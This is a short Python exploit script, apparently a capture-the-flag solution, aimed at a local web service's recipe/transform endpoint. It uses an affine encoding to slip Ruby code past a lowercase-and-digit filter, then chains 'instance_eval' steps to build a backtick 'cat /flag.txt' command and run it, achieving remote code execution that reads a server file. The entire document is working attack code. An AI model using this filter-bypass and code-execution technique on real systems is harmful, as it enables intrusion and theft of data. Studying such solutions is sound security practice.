import itertools
import requests
from string import ascii_lowercase, digits
ALLOWED = ascii_lowercase + digits

BASE_URL = 'http://0.0.0.0:1337'

def cook(recipe, ingredients):
    payload = { 'recipe': recipe, 'ingredients': ingredients }
    r = sess.post(f'{BASE_URL}/transform', json=payload)
    return r.json()

def instance_eval_recipe(payload):
    for a, b in list(itertools.product(range(128), repeat=2)):
        t = ''.join(chr((a * ord(x) + b) % 128) for x in payload)
        if all(c in ALLOWED for c in t) and a & 1:
            break
    else:
        return None, None
    recipe = [{ 'action': 'affine', 'options': [pow(a, -1, 128), (pow(a, -1, 128) * (128 - b)) % 128] }]
    recipe.append({ 'action': 'instance_eval' })
    ingredients = t
    return recipe, ingredients

sess = requests.Session()
sess.get(BASE_URL)

eval_payloads = '''
@s=96
@s=@s.chr
@X=@s
@Y=?c
@X+=@Y
@Y=?a
@X+=@Y
@Y=?t
@X+=@Y
@s=32
@s=@s.chr
@X+=@s
@Y=?/
@X+=@Y
@Y=?f
@X+=@Y
@Y=?l
@X+=@Y
@Y=?a
@X+=@Y
@Y=?g
@X+=@Y
@Y=?.
@X+=@Y
@Y=?t
@X+=@Y
@s=120
@s=@s.chr
@X+=@s
@Y=?t
@X+=@Y
@s=96
@s=@s.chr
@X+=@s
'''.splitlines()[1:]
for e in eval_payloads:
    recipe, ingredients = instance_eval_recipe(e)
    # if recipe is None:
    #     print('oh no', e)
    #     break
    # print(recipe, ingredients)
    print(cook(recipe, ingredients))
recipe, ingredients = instance_eval_recipe('@X')
recipe += [{'action': 'instance_eval'}]
print(cook(recipe, ingredients)['result'].strip())
